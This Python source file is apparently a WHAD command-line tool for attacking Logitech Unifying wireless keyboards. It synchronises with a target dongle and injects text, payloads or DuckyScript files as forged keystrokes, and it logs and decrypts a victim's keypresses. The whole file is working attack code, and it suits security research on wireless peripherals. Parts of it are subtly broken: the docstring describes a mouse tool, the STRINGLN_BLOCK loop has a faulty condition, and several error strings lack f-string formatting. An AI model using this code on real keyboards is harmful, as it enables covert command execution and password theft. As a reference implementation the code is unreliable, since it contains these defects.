"""Logitech Unifying mouse tool

This utility provides multiple features targeting Logitech Unifying mice:
- mouse movement and click logging
- interactive mouse and click injection (taking control over a wireless mouse)
- mouse and click injection from stdin
"""
import sys
import time
import logging

# Whad dependencies
from pynput import mouse
from whad.cli.app import CommandLineSink, run_app
from whad.unifying.connector import Keyboard, Keylogger, ESBAddress
from whad.unifying.stack.constants import ClickType
from whad.esb.exceptions import InvalidESBAddressException
from whad.exceptions import WhadDeviceNotFound

# Logging
logger = logging.getLogger(__name__)

TOOL_DESCRIPTION="""This tool synchronizes with an existing keyboard and logs keypresses or
inject specific payloads to the associated dongle."""

class DuckyScriptError(Exception):
    """DuckyScript error.
    """

    def __init__(self, message):
        super().__init__()
        self.__message = message

    def __str__(self):
        return f"DuckyScriptError(\"{self.__message}\")"

    def __repr__(self):
        return str(self)
    

class DuckyScriptRunner(object):
    """Ducky Script (tm) parser and runner.

    This class processes a DuckyScript in text form (not compiled) and executes
    it through python function instrumentation. This is a quick and dirty runner
    compatible with DuckyScript v1. 
    """

    # Commands format
    COMMANDS = {
        # Discard comments
        "//": None,
        "REM": None,

        # Delays
        "DEFAULTDELAY": "i",
        "DEFAULTCHARDELAY": "i",
        "CHARJITTER":  "i",
        "DELAY": "i",

        # String lines and blocks
        "STRING": "s",
        "STRINGLN": "s",
        "STRINGLN_BLOCK": "",
        "END_STRINGLN": "",
        "STRING_BLOCK": "",
        "END_STRING": "",

        # Keys
        "KEYDOWN": "k",
        "KEYUP": "k",

        # Loops
        "REPEAT": "i",
    }

    def __init__(self, file_path : str, connector: Keyboard):
        """Initialize ducky script parser.

        :param file_path: DuckyScript path
        :type file_path: str
        """
        self.__script_path = file_path
        self.__connector = connector
        self.__instructions = []

        # DuckyScript execution parameters
        self.__default_delay = 18
        self.__default_char_delay = 18
        self.__char_jitter = False

    def parse_operand(self, token: str, format: str) -> dict:
        """Transform an operand to an abstract notation, including
        its expected format.

        :param token: operand token
        :type token: str
        :param format: expected format
        :type format: str
        :return: dict representing this operand
        :rtype: dict
        """
        return {
            "value": token,
            "format": format,
        }

    def parse_operands(self, tokens: list, format: str) -> list:
        """Parse a set of operands from tokens and following
        expected operands format.

        :param tokens: list of operands as tokens
        :type tokens: list
        :param format: list of operands types
        :type format: str
        :return: list of parsed operands
        :rtype: list
        """
        parsed_operands = []
        
        # if no format provided, discard
        if format is None:
            return []

        # If we expect a single text string, all the tokens following the
        # instruction are part of the string. To handle this specific case,
        # we update the format string to take into account all remaining
        # tokens.
        if format.strip() == "s":
            format = "s"*len(tokens)
        elif len(tokens) != len(format):
            raise DuckyScriptError(f"Invalid format for instruction {tokens[0]}")

        # Try to convert token to expected format
        for i, token in enumerate(tokens):
            parsed_operands.append(self.parse_operand(token.strip(), format[i]))
        
        return parsed_operands


    def parse_line(self, line: str) -> dict:
        """This function parses a DuckyScript line and turns it into an abstract
        representation.

        :param line: line to parse
        :type line: str
        :return: abstract representation for this line
        :rtype: dict
        """
        # Trim line
        line = line.strip()

        # Split line
        tokens = line.split(' ')

        # Translate tokens to instructions
        inst = tokens[0].upper()

        # Parse command
        if inst in DuckyScriptRunner.COMMANDS:
            operands = self.parse_operands(
                tokens[1:],
                DuckyScriptRunner.COMMANDS[inst]
            )
        
            # Return instruction
            return {
                "inst": inst,
                "operands": operands
            }
        else:
            return {
                "data": line 
            }

    def to_multi_string(self, lines: list, last_enter=True) -> list:
        """Convert a series of lines to a series of typed text followed
        by an ENTER key after each line.

        :param lines: List of lines to interpret as text
        :type lines: list
        :param last_enter: If set to True, will include a press on ENTER key
                           for the last text line
        :type last_enter: bool
        :return: list of asbtract instructions
        """
        output = []
        for line in lines:
            output.append({
                "func": "send_text",
                "args":[line["data"]]
            })
            output.append({
                "func": "send_keys",
                "args": ["ENTER"]
            })

        # Remove last ENTER key press if required
        if not last_enter:
            output = output[:-1]

        return output

    def to_instructions(self, lines: list) -> list:
        """Convert lines to instructions.

        :param lines: Lines to convert to instructions
        :type lines: list
        :return: List of instructions
        """
        block = []

        # Loop on lines
        i = 0
        while i < len(lines):
            # Get current line
            line = lines[i]

            # If current line contains an instruction:
            if "inst" in line:
                # Don't process comments
                if line["inst"] in ["REM", "//"]:
                    pass
                elif line["inst"] == "DEFAULTDELAY":
                    block.append({
                        "func": "set_delay",
                        "args": line["operands"]
                    })
                elif line["inst"] == "DEFAULTCHARDELAY":
                    block.append({
                        "func": "set_char_delay",
                        "args": line["operands"]
                    })
                elif line["inst"] == "CHARJITTER":
                    block.append({
                        "func": "char_jitter",
                        "args": line["operands"]
                    })
                elif line["inst"] == "DELAY":
                    block.append({
                        "func": "delay",
                        "args": line["operands"]
                    })
                elif line["inst"] == "STRING":
                    # Combine operands to rebuild our string
                    op_string = []
                    for str_bit in line["operands"]:
                        if str_bit["format"] != "s":
                            raise DuckyScriptError("Syntax error line {i}")
                        op_string.append(str_bit["value"])
                    op_string = " ".join(op_string)

                    block.append({
                        "func": "send_text",
                        "args": [op_string]
                    })
                elif line["inst"] == "STRINGLN":
                    # Combine operands to rebuild our string
                    op_string = []
                    for str_bit in line["operands"]:
                        if str_bit["format"] != "s":
                            raise DuckyScriptError("Syntax error line {i}")
                        op_string.append(str_bit["value"])
                    op_string = " ".join(op_string)

                    block.append({
                        "func": "send_textline",
                        "args": [op_string]
                    })

                elif line["inst"] == "STRING_BLOCK":
                    # Pile up the following lines until we meet a "END_STRING"
                    # instruction.
                    j = i + 1
                    found_end = False
                    while j < len(lines):
                        if "inst" in lines[j] and lines[j]["inst"] == "END_STRING":
                            block.append({
                                "func": "execute",
                                "args": [self.to_multi_string(lines[i+1:j], last_enter=False)]
                            })
                            found_end = True
                            i = j + 1
                            break
                        else:
                            j += 1
                    
                    # Raise an error if we did not find the END_STRING command
                    if not found_end:
                        raise DuckyScriptError(f"Unfinished STRING_BLOCK, line {i}")
                elif line["inst"] == "STRINGLN_BLOCK":
                    # Pile up the following lines until we meet a "END_STRING"
                    # instruction.
                    j = i + 1
                    found_end = False
                    while i < len(lines):
                        if "inst" in lines[j] and lines[j]["inst"] == "END_STRINGLN":
                            block.append({
                                "func": "execute",
                                "args": [self.to_multi_string(lines[i+1:j])]
                            })
                            found_end = True
                            i = j + 1
                            break
                        else:
                            j += 1

                    # Raise an error if we did not find the END_STRING command
                    if not found_end:
                        raise DuckyScriptError(f"Unfinished STRINGLN_BLOCK, line {i}")
                elif line["inst"] == "REPEAT":
                    # Build a repeat instruction based on loop
                    block.append({
                        "func": "do_repeat",
                        "args": [block[-1], line["operands"][0]]
                    })

            # If line is data and we are not in a block
            elif "data" in line:
                # Parse data
                block.append({
                    "func": "send_keys",
                    "args": [line["data"]]
                })
            else:
                raise DuckyScriptError("Syntax error on line {i}")

            # Go next line
            i += 1

        # Execute our translated script
        return block

    def evaluate_expr(self, expr: dict):
        """Evaluate expression.

        This function only evaluates integer for now, but in a near future will
        also accept variables and basic operations.
        """
        expr_format = expr["format"]
        value = expr["value"]

        # Evaluate integer
        if expr_format == "i":
            return int(value)
        else:
            return None

    def execute(self, block: list):
        """Execute a block of asbtract instructions.

        :param block: List of abstract instructions
        :type block: list
        """
        for func_call in block:
            if "func" in func_call and "args" in func_call:
                func_name = func_call["func"]
                function = getattr(self, func_name)
                if function is not None:
                    # Call function with provided args
                    function(*func_call["args"])
                else:
                    raise DuckyScriptError(f"Cannot execute native method {func_name}.")
            else:
                raise DuckyScriptError("Wrong native function call for object {func_call}.")
            
            # Wait the specified delay between lines
            time.sleep(self.__default_delay/1000.)

    def run(self):
        """Run the provided DuckyScript using a Keyboard connector.

        This function parses a DuckyScript, transforms it into an abstract
        representation and executes it against the target device.
        """
        # Load script from file and tokenize
        try:
            self.__lines = []

            # First, parse all lines
            line_counter = 1
            with open(self.__script_path, 'r', encoding='utf-8') as script:
                for line in script:
                    # Trim line and parse
                    self.__lines.append(self.parse_line(line))
                    line_counter += 1

            # Convert lines to scripted calls
            script = self.to_instructions(self.__lines)

            # Execute script
            self.execute(script)
        except IOError:
            logger.debug("I/O Error while reading script %s", self.__script_path)
        except DuckyScriptError as exc:
            print(line)
            print(exc)
            logger.error("DuckyScript parsing error at line %d", line_counter)

    def do_repeat(self, inst, operand):
        """Implement the REPEAT operation of DuckyScript.

        This function evaluates the expression passed as operand, representing
        the number of iterations to perform, and execute the corresponding
        instruction as many times as required.

        :param inst: Abstract instruction to execute
        :type inst: dict
        :param operand: Abstract operand
        :type operand: dict
        """
        nb = self.evaluate_expr(operand)
        for _ in range(nb):
            self.execute([inst])

    def char_jitter(self, value):
        """Set character jitter.

        Character jitter is used to add random waiting times between key
        presses in order to mimick human behavior. For now, this feature is
        implemented but not effective as the underlying stack does not support
        it yet.

        :param value: jitter value to set
        :type value: dict
        """
        self.__char_jitter = self.evaluate_expr(value)

    def send_text(self, text: str):
        """Send text (without hitting ENTER) to the target Unifying dongle.

        :param text: Text to send
        :type text: str
        """
        print(text)
        self.__connector.send_text(text)

    def send_textline(self, text):
        """Send text (including final ENTER press) to the target Unifying
        dongle.

        :param text: Text to send
        :type text: str
        """
        self.__connector.send_text(text)
        self.__connector.send_key("ENTER")

    def send_keys(self, keys):
        """Send keys combination to the target keyboard dongle.

        :param keys: Keys combination as described in DuckyScript
        :type keys: str
        """
        gui = False
        shift = False
        ctrl = False
        alt = False

        # Split keys and extract special keys (gui, shift, control, alt)
        other_keys = []
        keys = keys.split(' ')
        for key in keys:
            key = key.strip()
            if key == "WINDOWS":
                gui = True
            elif key in ["SHIFT", "RSHIFT"]:
                shift = True
            elif key in ["CONTROL", "CTRL", "RCTRL", "RCONTROL"]:
                ctrl = True
            elif key in ["ALT", "RALT"]:
                alt = True
            else:
                other_keys.append(key)
        if len(other_keys) > 0:
            key = other_keys[0]
        else:
            key = ""

        # Send key through connector
        self.__connector.send_key(key, gui=gui, alt=alt, shift=shift, ctrl=ctrl)
        
    def set_delay(self, delay):
        """Set default delay.

        :param delay: Abstract operand that specifies the delay (in milliseconds)
        :type delay: dict
        """
        delay = self.evaluate_expr(delay)
        self.__default_delay = delay

    def set_char_delay(self, delay):
        """Set default char delay.

        :param delay: Abstract operand that specifies the delay (in milliseconds)
        :type delay: dict
        """
        delay = self.evaluate_expr(delay)
        self.__default_char_delay = delay

    def delay(self, delay):
        """Wait for a specific delay in ms.

        :param delay: Abstract operand that specifies the delay (in milliseconds)
        :type delay: dict
        """
        delay = self.evaluate_expr(delay)
        time.sleep(delay/1000.)


class UniKeyboardApp(CommandLineSink):
    """Logitech Unifying keyboard CLI app
    """

    mouse_coords = None

    def __init__(self):
        """Application uses an interface and has no commands.
        """
        super().__init__(
            description=TOOL_DESCRIPTION,
            interface=True,
            commands=False
        )

        # Target device address option
        self.add_argument(
            "-a",
            "--address",
            metavar='ADDRESS',
            dest='address',
            default=None,
            help="Target keyboard with address ADDRESS"
        )

        # Payload to inject
        self.add_argument(
            "-d",
            "--ducky",
            metavar="DUCKYSCRIPT",
            dest="ducky",
            type=str,
            help="DuckyScript to execute"
        )

        # Payload to inject
        self.add_argument(
            "-p",
            "--payload",
            metavar="PAYLOAD",
            dest="payload",
            type=str,
            help="Payload to inject"
        )

        # Keymap
        self.add_argument(
            "-l",
            "--locale",
            metavar="LOCALE",
            dest="locale",
            type=str,
            default="us",
            help="Use locale LOCALE (default: us)"
        )

        # Encryption key
        self.add_argument(
            "-k",
            "--key",
            metavar="ENCKEY",
            dest="key",
            type=str,
            help="Set encryption key (hex), will enable encryption/decryption if set"
        )

    def run(self):
        """Override App's run() method to handle scripting feature.
        """
        try:
            # Launch pre-run tasks
            self.pre_run()

            # We need to have an interface specified
            if self.interface is not None:
                # If an address is not provided, we cannot go further
                if self.args.address is None:
                    # Start scanning
                    self.error("You must specify a target keyboard address with -a/--address")
                else:
                    # If an address is provided, we check its format and start
                    # sniffing packets from this device

                    # Parse encryption key if provided
                    if self.args.key is not None:
                        try:
                            enc_key = bytes.fromhex(self.args.key)
                        except ValueError:
                            logger.debug("encryption key '%s' cannot be decoded.", self.args.key)
                            logger.debug("Make sure the encryption key is 128-bit long and in correct hex.")
                            enc_key = None
                    else:
                        enc_key = None

                    try:
                        # Check address format
                        addr = ESBAddress(self.args.address)
                        
                        # If -p/--payload option is set, sync and replicate our mouse moves
                        if self.args.payload is not None:
                            self.send_payload(addr, self.args.payload, self.args.locale, key=enc_key)
                        elif self.args.ducky is not None:
                            self.send_ducky(addr, self.args.ducky, self.args.locale, key=enc_key)
                        else:
                            # If stdin is piped, then we expect some mouse moves and clicks
                            # coming from stdin
                            if self.is_stdin_piped():
                                self.send_stdin(addr, self.args.locale, key=enc_key)
                            else:
                                
                                # Log keyboard events
                                self.log_keyboard(addr, self.args.locale, key=enc_key)
                    except InvalidESBAddressException:
                        # Invalid device address
                        self.error('Target address does not match the expected format !')
            else:
                # Missing interface.
                self.error('You need to specify an interface with option --interface.')

        except KeyboardInterrupt:
            self.warning('wuni-keyboard stopped (CTL-C)')

        # Launch post-run tasks
        self.post_run()

    def send_payload(self, address: ESBAddress, payload: str, locale: str, key: bytes = None):
        """Send payload to target keyboard.
        """
        # Connect to target device and performs discovery
        try:
            # Create our keyboard connector and set target address
            connector = Keyboard(self.interface)
            connector.address = str(address)

            # Set connector stack's locale
            connector.stack.get_layer('app').locale = locale

            # Set encryption key and counter if key is provided
            if key is not None:
                connector.key = key
                connector.aes_counter = 0

            # Start connector (enable keyboard mode)
            connector.start()
            
            # Synchronize with the dongle
            connector.synchronize()

            # Lock the dongle on the current channel
            connector.lock()

            # Send text payload followed by key
            connector.send_text(payload)
            connector.send_key("ENTER")

            # Stop connector
            connector.unlock()
            connector.stop()
        except (KeyboardInterrupt, SystemExit):
            connector.stop()

    def send_ducky(self, address: ESBAddress, ducky_script: str, locale: str, key: bytes = None):
        """Send ducky script
        """
        # Create our keyboard connector and set target address
        connector = Keyboard(self.interface)
        runner = DuckyScriptRunner(ducky_script, connector)
        connector.address = str(address)

        # Set connector stack's locale
        connector.stack.get_layer('app').locale = locale

        # Set encryption key and counter if key is provided
        if key is not None:
            connector.key = key
            connector.aes_counter = 0

        # Start connector (enable keyboard mode)
        connector.start()
        
        # Synchronize with the dongle
        connector.synchronize()

        # Lock the dongle on the current channel
        connector.lock()
        #time.sleep(.5)

        runner.run()

        connector.unlock()
        connector.stop()

    def send_stdin(self, address: ESBAddress, locale: str, key: bytes = None):
        """Read lines from stdin and send text (including ENTER) to target
        keyboard.
        """

        try:
            # Create our keyboard connector and set target address
            connector = Keyboard(self.interface)
            connector.address = str(address)

            # Set connector stack's locale
            connector.stack.get_layer('app').locale = locale

            # Set encryption key and counter if key is provided
            if key is not None:
                connector.key = key
                connector.aes_counter = 0

            # Start connector (enable keyboard mode)
            connector.start()

            # Synchronize with the dongle
            connector.synchronize()

            # Lock the dongle on the current channel
            connector.lock()

            # Wait for the dongle to be ready for injection
            time.sleep(.5)

            # Send data coming fron stdin (strip newlines and press ENTER instead)
            for line in sys.stdin:
                connector.send_text(line.strip())
                connector.send_key("ENTER")

            # Close connector
            connector.unlock()
            connector.close()

        except (KeyboardInterrupt, SystemExit):
            connector.stop()

    def log_keyboard(self, address: ESBAddress, locale: str, key: bytes = None):
        """Log keyboard presses (if not encrypted)
        """
        # Connect to target device and performs discovery
        try:
            connector = Keylogger(self.interface)
            connector.address = str(address)
            connector.scanning = True
            connector.locale = locale

            # Set encryption key if provided
            if key is not None:
                connector.decrypt = True
                connector.add_key(key)

            # Start logging keyboard events
            connector.start()
            out = ""
            for i in connector.stream():
                out += i
                print(out)

        except (KeyboardInterrupt, SystemExit):
            connector.close()

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)

def wuni_kb_main():
    """Logitech Unifying keyboard tool main routine.
    """
    app = UniKeyboardApp()
    run_app(app)
